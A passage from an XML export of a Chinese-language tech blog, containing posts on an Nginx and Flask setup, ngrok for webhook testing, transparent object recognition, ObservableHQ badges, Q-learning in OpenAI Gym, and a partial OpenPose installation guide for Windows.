再來是會場外面有零食可以拿，這點不錯，但比較奇怪的一點是拿了之後可以帶到裡面去吃，沒記錯的話好像很多研討會的場地裡面都是禁止飲食的，如果要吃東西的話要到外面來。我自己覺得台上在講話然後台下在吃零食其實滿奇怪的（有種看電影配爆米花的感覺），而且咀嚼聲跟一些開汽水的聲音都會影響到別人。除此之外我覺得沒什麼問題，然後講者講完之後會到外面固定區域坐著這一點很棒，因為你有問題的話就可以知道講者在哪邊然後直接去找他。
總之整體的感覺都不錯，很多講題我也都滿喜歡的，祝 Modern Web 一年比一年順利！
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>modern web</tag>
        <tag>conference</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx + Flask 動態與靜態頁面分離入門教學</title>
    <url>/2018/08/11/nginx-static-dynamic-page-server-intro/</url>
    <content><![CDATA[
前言Nginx（發音：engine x）是一個非同步的 Web 伺服器，也可以用作反向代理，負載平衡器和 HTTP 快取等功能。Flask 則是一個使用 Python 編寫的輕量級 Web 應用框架。 
有些讀者可能是學生或是事業剛起步的 startup，往往為了省錢或是開發方便會需要將 web 前後端都放在同一台機器上，本文希望透過簡單範例來建立一個前後端放在同一台 server 的入門教學，其中靜態檔案由 nginx 來負責 serve，而動態檔案則由 flask app + 開發用伺服器來提供 api endpoint（這邊因為教學方便，一般 production 上建議使用 uwsgi 或是 gunicorn，不要使用開發用伺服器）
環境建置工欲善其事，必先利其器。在開發應用程式之前往往需要設定好環境，這邊我們使用一台 Ubuntu 18.04 LTS server，安裝 python 和虛擬開發環境以及 nginx 等相關套件等。
$ sudo apt install python3-pip python3-dev build-essential libssl-dev libffi-dev python3-setuptools$ sudo apt install nginx$ sudo apt install python3-venv

設定 nginx config這邊為了方便我們直接更改 site-available&#x2F;default config 如一下檔案設定（site-available 下可存多個設定，真正使用是在 site-enabled 資料夾下，通常會用 link 連結過去）：
server &#123;        listen 80;        root /var/www; # serve 靜態檔案位置        index index.html;        location ^~ /api/v1 &#123; # 當 api prefix request 過來會 proxy 給 5000 port 的 local api service                proxy_pass http://127.0.0.1:5000;                proxy_set_header Host $host; # 在 proxy request 時保留 client 的 header        &#125;&#125;

重新讀取 config 檔案
$ sudo nginx -s reload
若不是使用 default config 檔案，也可以自己開一個新的檔案設定 config 檔案，最後要把設定好的 demo.conf link 到真正在使用的 sites-enabled config 資料夾
$ sudo ln -s /etc/nginx/sites-available/demo.conf /etc/nginx/sites-enabled/
撰寫測試用靜態網頁撰寫一個測試靜態頁面，正式情況可能會是一個 build 好的 html 檔案，裡面有含 HTML&#x2F;CSS&#x2F;JS 等前端靜態檔案（可能有使用前端框架）
/var/www/index.html&lt;h1&gt;Hello Nginx based static Page!!!&lt;/h1&gt;

這時候在瀏覽器觀看你的 server ip 應該會看到下列靜態檔案畫面：
撰寫 Flask 動態網站接著我們來撰寫後端 api service，首先先建立虛擬開發環境和安裝套件：
$ sudo python3.6 -m venv venv$ source venv/bin/activate$ sudo pip3 install flask

index.py 內容，設計一個測試用 api endpoint，提供 GET movies list
/var/www/index.pyfrom flask import Flask, jsonifyapp = Flask(__name__)@app.route(&quot;/api/v1/movies&quot;)def get_api():    movies = [&#123;&#x27;name&#x27;: &#x27;刺激1995&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;教父&#x27;&#125;]    return jsonify(movies)

成果展現這時候在虛擬環境下執行資料夾的 index.py 檔案：
$ FLASK_APP=index.py flask run

這時候在瀏覽器觀看你的 SERVER_ID&#x2F;api&#x2F;v1&#x2F;movies，應該會看到 fake api 回傳的 json 電影資料：
總結以上我們討論了簡單的 nginx + flask 動&#x2F;靜態檔案分離的 server 建置入門教學，若是更複雜的架構也可以把系統進行真正的前後端分離甚至是資料庫的讀寫分離等。但礙於篇幅我們今天就介紹到這邊，關於更多系統設計和架構設計的討論我們下次見囉～
延伸閱讀
Flask 官網
Nginx 官網

（image via matplotlib
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>測試 webhook 不再煩惱：ngrok</title>
    <url>/2018/05/24/ngrok/</url>
    <content><![CDATA[前言以前在開發 Chatbot 的時候，發現最困難的不是寫程式，而是測試。
為什麼呢？因為 Chatbot 的原理就是接收到訊息時發送一個 request 到你指定的位置（webhook），你再 call API 然後回訊息。
可是呢，這個 webhook url 通常都會有兩個需求：

必須要有一個 domain（不能只有 IP）
要是 https


因此測試的流程就變成這樣：

在 local 端先 coding，用肉眼 debug 看似一切都沒問題
上傳到 server
在聊天平台上測試，看有沒有收到訊息
看 server 的 log debug
發現問題，改 code，回到步驟 1

真正的 debug 流程是發生在 server 上面，因為聊天平台只能接受真的 domain，所以你也沒辦法在你的 localhost 測試。
現在的狀況應該好很多了，一開始 Chatbot 剛出來，大家都還在摸索然後官方文件又寫得不清不清楚的時候，來來往往就會花很多時間。你有可能會傳錯參數，或是搞錯 function。
正當我感到絕望的時候，有朋友跟我說了：你為什麼不用 ngrok 呢？
Debug 的救星：ngrok一句話介紹什麼是 ngrok：

一個可以把你 localhost 對應到 https public domain 的服務

例如說把你的 localhost:5000 對應到 https://fj2rijo3.ngrok.com。
這樣子做之後的好處就顯而易見了，你只要把 webhook 的 URL 填對應到的那個（完全符合那兩個條件），就可以在 localhost 上面測試了！
除此之外，使用上也超級無敵簡單。
你就去ngrok 官網註冊帳號、下載一個程式，設定好 auth token 之後，就可以靠一個指令做到我剛剛講的事了。
./ngrok http 5000 

只要這行指令，就可以把你的 5000 port 對應到一個 ngrok 提供的 https domain。

除此之外，在 console 也會不斷印出 request 的訊息，讓你可以簡單看到有哪些 request 以及 server 回覆的狀態碼是什麼。
總之呢，有了這個 ngrok 的 https domain 以後，你就可以把這個網址填到 webhook url 上面去測試了！
總結這次會寫出這篇文章是因為我最近又再次體驗到了 ngrok 的強大之處。這陣子在 debug 一個 PWA，發現 service worker 在 localhost 完全正常，可是 deploy 到 server 去的時候 lighthouse 的偵測就失敗了。
如果按照正常的流程，儘管你只是改一行 code，也要花費十分鐘跑 CI&#x2F;CD，所以一小時之內你只有六次改 code 的機會，不能再多了。
後來我想起有 ngrok 這個十分好用的東西，就把 ngrok 對應到 localhost 來測了，好處就是你改任何 code 都可以即時反應，效率真的是好很多。
下次如果你也需要一個 https 的網址來 debug，那我誠心推薦你 ngrok。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>ngrok</tag>
      </tags>
  </entry>
  <entry>
    <title>Object Recognition Kitchen 透明物體辨識(演算法概念)</title>
    <url>/2016/12/24/object-recognition-kitchen/</url>
    <content><![CDATA[前言這次的文章想要討論一個有趣的題目 – 透明物體辨識，這次的介紹先把題目限定在找出透明物體的位置，並把透明物體的輪廓找出來。
演算法功能簡介我們的演算法目的是要找出影像中的透明物體，並把輪廓圈出來，就像下面這張圖一樣。

其實如果要更精確，應該把想要辨識哪些透明物體、在那些場景、辨識成功率希望有多高、如何定義辨識成功等都說清楚，不過這邊想先帶給大家一個初步的概念，就不討論得太過瑣碎。
演算法概念為了達成這個功能，我們勢必要先收到彩色影像，所以肯定需要一台相機。不過下一個問題是，我們只需要用彩色影像資訊就能夠抓到透明物體的輪廓嗎? 還是我們需要其他的資訊 (也就是要不要考慮使用其他的 sensor) ?
要回答上面的問題，首先要來想想這個問題會什麼會困難。直覺上應該很容易發現，透明物體的顏色會隨著背景顏色不同而變，所以一般用顏色、紋理特徵來辨識的演算法都不太適用；此外，因為透明物體的邊界常常是模糊不清的，所以跟旁邊的物體很容易混在一起，造成輪廓抓錯。所以核心的問題就是，除了顏色、邊緣這些常用的特徵，我們還可以用什麼資訊來抓透明物體? 有一篇論文提出一個滿有趣的做法，他是使用 Kinect 的深度資訊，而且利用透明物體在 Kinect 的深度圖裡面會有破洞的特性，當成一個辨識的起點:

這個概念主要來自這篇論文 – Recognition and Pose Estimation of Rigid Transparent Objects with a Kinect Sensor，他提出的做法是，利用深度圖裡面有大塊破洞的位置，猜測這塊位置是透明物體，接著再根據這個線索找出透明物體的輪廓。
所以下一個問題就是，怎麼根據這個粗略的位置，把透明物體的輪廓切出來，論文中使用的方法是 Grabcut 演算法，這個演算法需要先有一個初始的前景跟背景線段，然後根據這個線段區分出前景跟背景，例如在下圖中，紅色線段是前景、藍色線段是背景，接著 Grabcut 演算法會根據顏色的近似程度還有距離關係，算出綠色框框內那些是前景、哪些是背景，然後把前景切出來。

切出來之後，目的就算是達成了！當然後續還有很多問題待討論（例如背景的複雜度、怎麼對深度影像中的破碎點做一些基本的處理等），不過今天先把範圍限縮在最上層的概念。
總結演算法的應用真的是千奇百怪，但不管是簡單的演算法題目還是困難的演算法題目，解決的方法都是要看出問題的本質，然後再根據這個問題的特性去使用特定的步驟來解決。像這個範例就是巧妙地利用 Kinect 特性來處理透明物體的特徵很難抓的這個問題，畢竟會在 Kinect 的深度圖中固定呈現出破洞也算是一種特徵，至於更詳細的演算法流程或是程式碼的部分，就留待未來再介紹囉！
延伸閱讀演算法介紹投影片ORK 的 transparent object recognition page
關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>algorithm</tag>
        <tag>演算法</tag>
        <tag>機器人</tag>
        <tag>ROS</tag>
        <tag>OpenCV</tag>
        <tag>物體辨識</tag>
        <tag>Object Recognition Kitchen</tag>
      </tags>
  </entry>
  <entry>
    <title>從製作 visfest 2019 badge 認識 ObservableHQ</title>
    <url>/2019/09/09/observablehq-intro/</url>
    <content><![CDATA[前言軟體工程師應該很少沒參加過 Conference 吧，不管是社群或是學術性的，只要是與會者都會拿到一面主辦方製作的名牌，上面除了印著你的大名外，大多就剩下 Conference 名稱與 Logo 了，然而，由灣區的資料視覺化社群所舉辦的年度聚會 - visfest unconf 很是特別，他們提供與會者一個製作自己 badge 的機會，讓大家自行發揮創意，特別之餘也很符合整個會議的調性。今年八月是他們舉辦的第五屆 visfest unconf，這次他們在 ObservableHQ 這個平台上釋出了一個 Template，讓大家更方便的製作名牌，效果如同下方（因為用到 ECMAScript modules，建議使用桌面版 Chrome），若無法觀看，可以前往此 link，或是拉到最下面看 gif：



  import notebook from "https://cors-anywhere.herokuapp.com/https://api.observablehq.com/@arvinh/visfest-unconf-badge-builder-template.js";

  const renders = {
    "result": "#animation",
  };

  import {Inspector, Runtime} from "https://unpkg.com/@observablehq/notebook-runtime@2?module";
  for (let i in renders)
    renders[i] = document.querySelector(renders[i]);

  Runtime.load(notebook, (variable) => {
    console.log(variable)
    if (renders[variable.name])
      return new Inspector(renders[variable.name]);
  });


除了 Observable 與 visfest 的 Logo 外，你可以繪製任何你想呈現的東西，改變背景顏色等等，而主辦方會用 gitpop 這項服務，將你的動畫製作成 10 frames 的 gif，因此在製作時，可以根據 template 提供的繪圖函式傳入的 frameNumbers 來控制動畫的呈現。
我自己是覺得這樣的想法很酷，所以即便無緣參加 visfest unconf，也製作了一個自己的 Badge 玩玩，順便來試用已經想玩很久的平台 ObservableHQ，這篇文章就記錄一下使用的過程，並說明其特性，希望能引起大家興趣！
ObservableHQ 起源D3.js 的作者 @mbostock，在 2017 年的時候發了一篇名為 A Better Way to Code 的文章，介紹了他當時正在製作的專案 - d3.express，也就是現在的 ObservableHQ。

Mike Bostock 在過去十年左右的時間都致力於資料視覺化，為了能夠更方便的將資料以各種方式呈現，D3.js 因應而生，然而，致力於一個工具太久，反而忘了當初為何要製作工具，目的變成了工具本身，而不是透過該工具所能傳達的價值。

The purpose of visualization is insight, not pictures - Ben Shneiderman

資料視覺化的重點應在於將資料的 insight 更加輕易的傳遞給世界，儘管現在已經有很多圖形化介面的拖拉工具輔助你將資料視覺化，但若是想要最大幅度的自由創作並表達 insight，撰寫程式碼是無可避免的。
然而寫程式一直都不是一件簡單的事，為了降低寫程式的難度，他創造了另一個工具：ObservableHQ。你可以把它想像成 JavaScript 版本的 jupyter notebook，但使用上某些語法跟純 JavaScript 有些差異，因此剛開始可能會有些不太習慣的地方，等到上手後，你就會發現它的好用之處，尤其適合應用在製作資料視覺化專案上。
ObservableHQ 基礎操作ObservableHQ 其實不能算是 JavaScript，因為有許多操作行為與 vanilla JavaScript 不相同，作者也有寫了一篇說明。
基本上，你可以把 ObservableHQ 想像成一個試算表，由一格一格的 cell 所組成，而每一格 cell 都是一個 JavaScript snippet，可以是一則運算式、一段簡短的函式，當然也可以將值指定給一變數名稱。

在上面的圖片中，比較不同的地方在於運算函式的寫法，除了一般的 Function Declarations 與 Function Expressions 外，你也可以用一個大括號 &#123;&#125; 包裹著一段程式碼，最後 return 出去的值，就會被印出來。
而就像試算表的公式一樣，表格內的值是互相 reference 的，只要你在某處修改了某個 cell 的值，所有引用到該 cell 的程式都會相應改變（re-run），跟一般 vanilla JavaScript 從上到下執行程式碼的邏輯有所不同：

從這點來看，你也可以把所有在 ObservableHQ 上的變數 assignments 都想成是 hoisted declarations，因為宣告順序不影響 reference。
此外，支援使用 html 與 markdown 的語法，利用 Template literals 來完成：

還有一個特別的 built-in 運算子 - viewof：

如上面的 gif 所示，viewof 可以將使用者針對一個 html input element 操作所產生的值，exposes 出來，或是 assign 給一個變數。可以想見，這用在互動式視覺化專案中會是很棒的功能。
這幾個大概是最基本的操作，還有其他諸如：如何匯入第三方套件、使用非同步 API 呼叫等等，我們就直接透過實際演練來學習吧！
ObservableHQ 實際操作接下來用我這次製作的 visfest badge 來做範例，進一步帶大家認識這個工具！
這次的 badge，主要概念是在 2D 地球圖上，顯示各城市的人口數量級別，用地球的轉動與 marker 的 radius 大小變化來呈現動畫。
要完成這個目標，起手第一步就是得先把 2D 地球畫出來。而 Mike Bostock 有提供一份 topojson 格式的世界地圖資料：https://unpkg.com/world-atlas@1/world/110m.json。
因此，我們需要載入 topojson 套件，並 fetch 世界圖資，而在 ObservableHQ 上我們可以這樣做：

這邊我們用 require 來載入 topojson 套件，但其實它背後並非 CommonJS，而是用 Asynchronous Module Definition (AMD) 實作。另外它也支援 ES modules 與 imports，所以可以依照你所使用的套件支援度來選擇要用哪種方式載入模組。
至於取得世界圖資，我們需要兩個步驟：

取得圖資 JSON 檔案：let world = await (await fetch(&quot;https://unpkg.com/world-atlas@1/world/110m.json&quot;)).json();
取得拓樸後的資料：topojson.feature(world, world.objects.countries);

在 ObservableHQ 上，我們可以利用先前說到的大括號 &#123;&#125; 來執行多行程式碼，並把最後 return 的值賦予給某個變數：

接著還需要有各城市的人口資料，取得方式與上面相同：

資料到手後，剩下的就就跟一般撰寫 D3.js 的專案ㄧ樣。
在 visfest 提供的模板中，提供了許多以定義好的變數宣告，像是姓名、字體亮度、大小等等，而我們只需要在 badgeCode 這個函數中實作我們的視覺化作品即可。
// Your D3 code goes here.// The function badgeCode gets called below to generate the previews.function badgeCode(g, c, frameNumber) &#123;  // g: a &lt;g&gt;, i.e. d3.select(... the node)  // context: a canvas context, useful for doing canvas drawing  // frameNumber: a number that represents the frame (1, 2, … 10) for psuedo-animation.  // width &amp; height are available via the environment, as is d3  // Note: the &lt;g&gt; is drawn on top of the &lt;canvas&gt;&#125;

badgeCode 接收三個參數，一個是在 badge 上留給你繪圖的空間 &lt;g&gt; 元素，以及 canvas context 和 frameNumber，該模板會呼叫此函式十次，依序傳入遞增的 frameNumber，讓你來掌控動畫過程。
到這邊可能你會好奇，在 ObservableHQ 中的 模板 到底是怎麼運作的？為什麼能定義出一個函式，讓我去填寫內容，又幫我執行呢？
答案要追究到 ObservableHQ 的一個特殊 import-with 方法：

b93171820ba3f268 是 ObservableHQ 上的另一個 notebook，也就是實際的 template 程式碼所在位置，我們可以從該 notebook 中 import 進 &#123;preview, animation, download, width, height, d3&#125; 這幾個函式來呼叫使用，而這幾個函式中所用到的變數，我們能使用 with 來取出，並且賦予其新的值！
這就是為什麼我們可以修改 firstName、lastName 以及自行填入 badgeCode 函數的原因了。
badgeCode 內的程式碼基本上就是普通的 D3.js 程式，這邊就不再附上程式碼，有興趣想知道怎麼實作在地球呈現人口分布的，可以到我的 notebook 去看，其中我也有用到前面提及的 viewof 運算子，讓我能手動調整地球的 scale 大小。
都完成後就會看到由模板提供的 preview 函式所繪製出的十張圖：

以及用 animation 函式（一樣模板提供）繪製的動畫：

分享你的 ObservableHQ 作品完成作品後，最重要的就是分享。
這篇文章的最上方，我放入的成品並不是 gif，而是貨真價實從 ObservableHQ 所匯入的，利用 ECMAScript modules，載入想要嵌入的 notebook，接著再載入 ObservableHQ 提供的 &#123;Inspector, Runtime&#125;，當 notebook 載入後，取得其中 export 的變數，透過 Inspector 將其繪製到指定的 DOM id 上：
&lt;div id=&quot;animation&quot;&gt;&lt;/div&gt;&lt;script type=&quot;module&quot;&gt;  import notebook from &quot;https://cors-anywhere.herokuapp.com/https://api.observablehq.com/@arvinh/visfest-unconf-badge-builder-template.js&quot;;  const renders = &#123;    &quot;result&quot;: &quot;#animation&quot;,  &#125;;  import &#123;Inspector, Runtime&#125; from &quot;https://unpkg.com/@observablehq/notebook-runtime@2?module&quot;;  for (let i in renders) &#123;    renders[i] = document.querySelector(renders[i]);  &#125;  Runtime.load(notebook, (variable) =&gt; &#123;    if (renders[variable.name]) &#123;      return new Inspector(renders[variable.name]);    &#125;  &#125;);&lt;/script&gt;

透過這種方式，除了能夠在 ObservableHQ 上載入引用他人的 notebook 外，也能在一般網站上嵌入任何作品，非常方便！
結論這篇文章只是非常簡略的說明了 ObservableHQ 的起源、用途與使用方式，希望能引起大家的興趣，如果有想要使用這套工具玩玩，或是製作視覺化專案的話，官方網站其實有出了一系列的教學與說明文件，直接就是用 ObservableHQ 的 notebook 撰寫的，互動式的閱讀體驗非常好，可以非常清楚的知道各個環節該怎麼使用，以及其背後的設計原理。

資料來源
Observablehq five minute intro
Observable’s not JavaScript
Observablehq introduction

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>d3.js</tag>
        <tag>visualization</tag>
      </tags>
  </entry>
  <entry>
    <title>Open AI Gym 簡介與 Q learning 演算法實作</title>
    <url>/2017/11/04/openai-gym-intro-and-q-learning/</url>
    <content><![CDATA[前言這次我們來跟大家介紹一下 OpenAI Gym，並用裡面的一個環境來實作一個 Q learning 演算法，體會一次 reinforcement learning (以下簡稱 RL) 的概念。
OpenAI Gym 是一個提供許多測試環境的工具，讓大家有一個共同的環境可以測試自己的 RL 演算法，而不用花時間去搭建自己的測試環境。
把 Gym 跑起來的最簡單範例一開始學習，範例總是越簡單越好，這樣才會有開始上手的成就感。
import gymenv = gym.make(&#x27;CartPole-v0&#x27;)env.reset()for _ in range(1000):	env.render()	env.step(env.action_space.sample()) # take a random action

執行這個 .py 檔之後，你應該會看到一個隨便亂動的 cartpole，畫面一下就消失了。
基本上，OpenAI Gym 提供了許許多多的環境，你可以將 CartPole-v0 換成 MountainCar-v0、MsPacman-v0 (需安裝 Atari) 或是 Hopper-v1 (需要安裝 MuJoCo) 等等，你可以在 這邊 找到更多環境。
ObservationRL 的一個重要步驟是取得環境狀態，在 Gym 裡面，由 step function 提供環境狀態。step 會回傳 4 個變數，分別是

observation (環境狀態)
reward (上一次 action 獲得的 reward )
done (判斷是否達到終止條件的變數)
info ( debug 用的資訊)

從呼叫 reset，整個環境就會重頭開始，此外 reset 會回傳一個初始的環境狀態。
import gym  env = gym.make(&#x27;CartPole-v0&#x27;)  for i_episode in range(1): #how many episodes you want to run	observation = env.reset() #reset() returns initial observation  	 for t in range(100):		 env.render()		 print(observation)		 action = env.action_space.sample()		 observation, reward, done, info = env.step(action)		 if done:			 print(&quot;Episode finished after &#123;&#125; timesteps&quot;.format(t+1))			 break

執行上面這一段程式碼，你就會看到每一步收到的環境狀態不斷地被印在 terminal。
Space除了 observation 之外，RL 中另一個重點就是要定義可以做的 action，這兩者都由 space 來定義。
大家可以使用下面的程式碼來查看 action space 跟 observation space。
import gymenv = gym.make(&#x27;CartPole-v0&#x27;)## Check dimension of spaces ##print(env.action_space)#&gt; Discrete(2)print(env.observation_space)#&gt; Box(4,)## Check range of spaces ##&quot;&quot;&quot;print(env.action_space.high)-You&#x27;ll get error if you run this, because &#x27;Discrete&#x27; object has no attribute &#x27;high&#x27;&quot;&quot;&quot;print(env.observation_space.high)print(env.observation_space.low)

此外，你也可以 assign 自己的 action space，像下例中就把 action space 設成只包含一個 action，所以 agent 就永遠只能採取同一種 action，你看得出來是向左還是向右嗎？
import gymfrom gym import spaces  env = gym.make(&#x27;CartPole-v0&#x27;)env.action_space = spaces.Discrete(1) # Set it to only 1 elements &#123;0&#125;  for i_episode in range(5): #how many episodes you want to run	observation = env.reset() #reset() returns initial observation 	for t in range(200):		 env.render()		 print(observation)		 action = env.action_space.sample()		 observation, reward, done, info = env.step(action)		 if done:			 print(&quot;Episode finished after &#123;&#125; timesteps&quot;.format(t+1))			 break

來學習一個真正有學習能力的演算法 - Q-learning經過上面的介紹，大家應該對 Gym 有了基本的認識，也跟 RL 最重要的 observation 和 action 銜接起來了。接下來就是今天的重頭戲，讓我們來真正實作一個演算法來學著不讓 pole 倒下來。
關於 Q leanring，推薦大家直接看這一小段 Q learning 演算法介紹，看完應該就可以直接懂這個演算法：

裡面只有一處比較不直覺，就是在更新 Q table 時，計算 reward 不只包含採取 action $a$ 獲得的 reward $r$，還包含 $\gamma max_{a’}Q(s’, a’)$。這個概念是，agent 不僅僅看當下採取的行動帶來的好處，他也會估計到達下一個 state $s’$ 後，最多可以有多少好處（因為在 $s’$ 也可以採取各種 action）。換句話說，這個 agent 不是一個目光如豆的 agent，他會考慮未來。因為加上了 $\gamma max_{a’}Q(s’, a’)$ (當然，$\gamma$ 不能是 0)，讓我們的 agent 從 會立刻吃掉棉花糖的小朋友，進化成可以晚一點再吃多一點棉花糖的小朋友，是不是很有趣呢！
經過以上的說明，大家應該可以了解 Q learning 演算法的核心概念了。這時大家可能會有點疑惑，之前好像有聽過 Deep Q learning，那跟 Q learning 差在哪邊呢？其實就只是有沒有使用到 Deep neural network 而已，如果你理解這個演算法，應該不難發現他的能力滿有限的，很難拿來學習完成複雜的 task，所以才有人引入 DNN 來讓其學習能力變得更強。
實作 Q learning程式碼是參考 這篇文章 ，裡面有介紹詳細的思考及調整過程。有興趣深入了解的讀者可以參考看看。
import gymimport numpy as npimport randomimport mathfrom time import sleep    ## Initialize the &quot;Cart-Pole&quot; environmentenv = gym.make(&#x27;CartPole-v0&#x27;)  ## Defining the environment related constants  # Number of discrete states (bucket) per state dimensionNUM_BUCKETS = (1, 1, 6, 3) # (x, x&#x27;, theta, theta&#x27;)# Number of discrete actionsNUM_ACTIONS = env.action_space.n # (left, right)# Bounds for each discrete stateSTATE_BOUNDS = list(zip(env.observation_space.low, env.observation_space.high))STATE_BOUNDS[1] = [-0.5, 0.5]STATE_BOUNDS[3] = [-math.radians(50), math.radians(50)]# Index of the actionACTION_INDEX = len(NUM_BUCKETS)  ## Creating a Q-Table for each state-action pairq_table = np.zeros(NUM_BUCKETS + (NUM_ACTIONS,))  ## Learning related constantsMIN_EXPLORE_RATE = 0.01MIN_LEARNING_RATE = 0.1  ## Defining the simulation related constantsNUM_EPISODES = 1000MAX_T = 250STREAK_TO_END = 120SOLVED_T = 199DEBUG_MODE = True  def simulate():  ## Instantiating the learning related parameters	learning_rate = get_learning_rate(0)explore_rate = get_explore_rate(0)discount_factor = 0.99 # since the world is unchanging  num_streaks = 0  for episode in range(NUM_EPISODES):  # Reset the environment	obv = env.reset()  # the initial statestate_0 = state_to_bucket(obv)  for t in range(MAX_T):	env.render()  # Select an action	action = select_action(state_0, explore_rate)  # Execute the actionobv, reward, done, _ = env.step(action)  # Observe the resultstate = state_to_bucket(obv)  # Update the Q based on the resultbest_q = np.amax(q_table[state])q_table[state_0 + (action,)] += learning_rate*(reward + discount_factor*(best_q) - q_table[state_0 + (action,)])  # Setting up for the next iterationstate_0 = state  # Print dataif (DEBUG_MODE):	print(&quot;\nEpisode = %d&quot; % episode)	print(&quot;t = %d&quot; % t)	print(&quot;Action: %d&quot; % action)	print(&quot;State: %s&quot; % str(state))	print(&quot;Reward: %f&quot; % reward)	print(&quot;Best Q: %f&quot; % best_q)	print(&quot;Explore rate: %f&quot; % explore_rate)	print(&quot;Learning rate: %f&quot; % learning_rate)	print(&quot;Streaks: %d&quot; % num_streaks)  	print(&quot;&quot;)  	if done:	print(&quot;Episode %d finished after %f time steps&quot; % (episode, t))	if (t &gt;= SOLVED_T):		num_streaks += 1		else:		num_streaks = 0		break  #sleep(0.25)  # It&#x27;s considered done when it&#x27;s solved over 120 times consecutively		if num_streaks &gt; STREAK_TO_END:		break  # Update parameters		explore_rate = get_explore_rate(episode)learning_rate = get_learning_rate(episode)    def select_action(state, explore_rate):# Select a random action	if random.random() &lt; explore_rate:	action = env.action_space.sample()# Select the action with the highest qelse:action = np.argmax(q_table[state])return action    def get_explore_rate(t):	return max(MIN_EXPLORE_RATE, min(1, 1.0 - math.log10((t+1)/25)))  	def get_learning_rate(t):		return max(MIN_LEARNING_RATE, min(0.5, 1.0 - math.log10((t+1)/25)))  		def state_to_bucket(state):			bucket_indice = []			for i in range(len(state)):				if state[i] &lt;= STATE_BOUNDS[i][0]:				bucket_index = 0				elif state[i] &gt;= STATE_BOUNDS[i][1]:				bucket_index = NUM_BUCKETS[i] - 1				else:# Mapping the state bounds to the bucket array				bound_width = STATE_BOUNDS[i][1] - STATE_BOUNDS[i][0]				offset = (NUM_BUCKETS[i]-1)*STATE_BOUNDS[i][0]/bound_width				scaling = (NUM_BUCKETS[i]-1)/bound_width				bucket_index = int(round(scaling*state[i] - offset))bucket_indice.append(bucket_index)return tuple(bucket_indice)  if __name__ == &quot;__main__&quot;:simulate()

總結這篇文章跟大家說明了 OpenAI Gym 裡面的基本組成，也介紹了 Q learning 演算法及實作。有興趣更深入研究的讀者可以以此為基礎，繼續鑽研。
延伸閱讀
什麼是強化學習
rllab - a framework for developing and evaluating reinforcement learning algorithms

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在學習看清事物的本質與改進自己的觀念
]]></content>
      <tags>
        <tag>Reinforcement Learning</tag>
        <tag>OpenAI Gym</tag>
        <tag>Q Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在 Windows 安裝 OpenPose 跟使用 Python API 來偵測人體姿態</title>
    <url>/2019/01/18/openpose-installation/</url>
    <content><![CDATA[前言
OpenPose 是 Carnegie Mellon University（CMU）論文實作的開源函式庫，提供的功能主要就是可以偵測人體的各部位在什麼地方，例如可以在影像中找到臉、身體、手等等地方的特徵點。但他厲害的地方在於可以一次偵測很多人，看看下面這張圖就知道：

這個 repository 仍然相當地 active，有兩個 CMU 的學生常常在 Github 上面解 issue。這次因為筆者需要在 Windows 上面安裝 OpenPose 並呼叫 Python API，所以跟開發者有不少互動，才想到乾脆來寫一篇教學，讓之後想要使用 OpenPose 的讀者可以省去好幾天的環境安裝 debug。
OpenPose 演算法簡介
上面是 OpenPose 的架構圖，輸入會是一張大小為 w x h 的彩色影像；接著會先經過 Stage 0 的 VGG-19 Network，得到輸入影像的 feature map；然後會在 Stage 1 經過一些 CNN 來得到身體各部位的 confidence map。Stage 1 分成兩個 branch，branch 1 可以產生某特定部位的 confidence map，例如左肩的 confidence map：

branch 2 則是產生不同身體部位之間的關聯性，例如脖子跟左肩的關係：

最後結合這些結果就可以得到全身各部位大致在什麼地方，還有彼此相對位置的關係。以上的講法有點過於簡化，有興趣的讀者可以看看延伸閱讀 1 的原始論文。
Windows 安裝步驟
確認一下你的硬體跟作業系統符合 OpenPose 要求

Clone OpenPose 的原始碼
因為我們要使用 Python API，所以不能只是下載已經編譯好的 library 文件，必須要從原始碼開始編譯。我推薦大家可以用 Github Desktop 來下載原始碼 &amp; 管理。

下載並安裝 CMake GUI
可以上 CMake 的網站下載，Windows 的話請下載 cmake-X.X.X-win64-x64.msi。

安裝 Visual Studio 2015
OpenPose 的官方要求是 Visual Studio 2015 Enterprise Update 3，但似乎也有人用 Visual Studio 2015 Community 安裝成功。筆者是用 Enterprise 版本安裝成功的。

安裝 CUDA
官方推薦的版本是 CUDA 8。這一步要在安裝完 Visual Studio 之後做，因為安裝過程會產生一些 Visual Studio 需要的檔案。

安裝 cuDNN
官方建議安裝 5.1 版本。安裝方法很簡單，只要把下載的壓縮檔內容解壓縮到 C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v8.0 路徑就好。（cuDNN 壓縮檔裡面會有三個資料夾，可以對應到 C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v8.0 裡面也有的資料夾，分別把檔案放到對應的資料夾就好）。

開始設定 CMake 來準備編譯需要的檔案

設定檔案路徑（在 clone 下來的路徑中自己創一個 build 資料夾，並設定成 Where to build the binaries）

按下 Configure 按鈕（generator 記得選 Visual Studio 14 2015 Win64）




　    

等待 Configure Done   

勾選 BUILD_PYTHON   

按下 Generate



用 Visual Studio 2015 打開 build/OpenPose.sln 檔案
切換到 Release Mode 並 Build Project

這一步很重要，因為只用 Debug Mode build 會讓後面的 Python API 啟動失敗。詳見 issue 1026。
Python API 呼叫步驟如果上面的步驟都做完，應該可以在 openpose\build\python\openpose\Release 看到 openpose_python.cp36-win_amd64.pyd library 文件。（OpenPose 原生是用 C++ 寫的，是用 pybind11 包成 Python 可以呼叫的 library）。
接著，我們準備要來跑 openpose\build\examples\tutorial_api_python\1_body_from_image.py，要記得把裡面的 library 搜尋路徑改成自己的：
我可以跑起來的範例如下：
